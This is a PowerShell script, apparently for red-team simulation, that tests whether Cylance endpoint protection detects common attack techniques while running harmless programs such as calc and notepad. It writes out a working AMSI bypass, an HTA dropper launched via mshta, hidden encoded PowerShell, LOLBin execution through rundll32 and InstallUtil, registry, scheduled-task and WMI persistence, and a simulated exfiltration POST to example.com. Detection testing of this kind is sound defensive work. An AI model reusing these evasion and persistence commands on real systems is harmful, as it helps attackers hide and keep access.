# Phase 5: Cylance Red Team Simulation Script
# Author: imrankhairuddin
# Status: SAFE for testing, does not perform actual exfil or malware ops

function RedSim {
    param($step, $command)
    Write-Host "`n== [$step] ==" -ForegroundColor Cyan
    Write-Host "Executing: $command" -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    try {
        Invoke-Expression $command
    } catch {
        Write-Warning "Failed: $_"
    }
    Start-Sleep -Seconds 4
}

# Initial Access - HTA file masquerading as macro
$hta = "$env:TEMP\macro.hta"
@"
<html><script>
var sh = new ActiveXObject('WScript.Shell');
sh.Run('powershell -w hidden -nop -c calc');
</script></html>
"@ | Out-File -Encoding ASCII $hta
RedSim "Initial Access (HTA dropper)" "Start-Process mshta.exe $hta"

# Execution - Encoded PowerShell + -w hidden + -nop
$payload = "Start-Process notepad"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
RedSim "Encoded PowerShell (with bypass flags)" "powershell.exe -w hidden -nop -EncodedCommand $encoded"

# AMSI Bypass
RedSim "AMSI Bypass" '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true); Start-Process calc'

# Rundll32 LOLBin (non-malicious simulation)
RedSim "Rundll32 LOLBin Simulation" 'rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe'

# InstallUtil Execution Path (used in attacks)
$stubPath = "$env:TEMP\HelloWorld.cs"
@"
using System;
public class HelloWorld {
  public static void Main() {}
  public static void Uninstall(String args) {
    System.Diagnostics.Process.Start(""notepad"");
  }
}
"@ | Out-File -Encoding ASCII $stubPath
csc.exe /t:library /out:$env:TEMP\HelloWorld.dll $stubPath > $null
RedSim "InstallUtil Execution (DLL sim)" "InstallUtil.exe /U $env:TEMP\HelloWorld.dll"

# Registry Persistence (CurrentUser)
RedSim "Registry Persistence" 'Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RedTeamSim" -Value "powershell.exe -w hidden -c notepad"'

# Scheduled Task Persistence
RedSim "Scheduled Task Persistence" 'schtasks /create /tn "RedTeamStartup" /tr "calc.exe" /sc onlogon /rl highest /f'

# WMI Persistence Simulation
RedSim "WMI Persistence Sim" 'wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="RedTeamTrigger", EventNamespace="Root\\Cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA `'Win32_LocalTime`'"'

# Logging Disablement (Simulated - no effect)
RedSim "Simulated Logging Disable" 'Write-Output "[+] Pretending to disable logs..."'

# Anti-Forensic Delay + Forking
RedSim "Sleep + Fork" 'Start-Sleep -Seconds 5; Start-Process powershell -ArgumentList "-c", "Start-Process calc"'

# Simulated Lateral Movement (Fake copy of payload)
RedSim "Simulated Lateral Movement" 'Copy-Item "$env:WINDIR\notepad.exe" "\\127.0.0.1\C$\Users\Public\notepad.exe" -Force'

# Simulated Exfiltration
RedSim "Simulated Data Exfil" 'Invoke-WebRequest -Uri "http://example.com/upload" -Method POST -Body "dummy_data=1234"'

#Write-Host "`n Phase 5 complete. Review all Cylance logs, memory events, EDR process trees." -ForegroundColor Green
